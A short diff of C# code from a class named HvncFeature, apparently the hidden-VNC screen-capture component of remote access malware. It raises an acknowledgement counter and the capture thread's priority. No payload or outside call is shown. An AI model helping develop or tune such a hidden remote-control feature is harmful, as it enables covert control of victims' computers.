@@ -373,11 +373,11 @@ internal static class HvncFeature
         EnsureGdiplus();
         // Try H264 encoder — graceful fallback to JPEG if MF unavailable
         _h264Enc = H264Encoder.Create(_canvasW, _canvasH, cfg.Fps);
-        Interlocked.Exchange(ref _pendingAcks, 4);
+        Interlocked.Exchange(ref _pendingAcks, 8);
         _running = true;
         _captureThread = new Thread(CaptureLoop)
         {
-            IsBackground = true, Name = "HvncCapture", Priority = ThreadPriority.Normal
+            IsBackground = true, Name = "HvncCapture", Priority = ThreadPriority.AboveNormal
         };
         _captureThread.Start();
     }
